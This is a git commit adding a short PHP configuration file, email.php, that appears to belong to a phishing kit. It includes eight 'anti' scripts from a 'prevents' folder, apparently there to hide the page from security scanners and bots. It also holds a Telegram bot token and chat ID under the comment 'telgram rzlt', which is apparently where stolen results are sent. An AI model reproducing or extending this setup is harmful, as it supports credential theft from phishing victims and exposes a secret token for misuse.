25fa648a14a386e2d6aa7cf048c009a28ffa4f58
poalmsi <aichahazli4@gmail.com>
2025-10-08 04:51:39 +0200

    Add files via upload

---
+++ email.php
@@ -0,0 +1,19 @@
+<?php
+
+include '../prevents/anti1.php';
+include '../prevents/anti2.php';
+include '../prevents/anti3.php';
+include '../prevents/anti4.php';
+include '../prevents/anti5.php';
+include '../prevents/anti6.php';
+include '../prevents/anti7.php';
+include '../prevents/anti8.php';
+
+$email =""; 
+
+//telgram rzlt
+$api = "8279590866:AAGIP01JDgJw7XSScixpgYp2IRCeyQPBVLI";
+$chatid = "-4977056930";
+
+
+?>
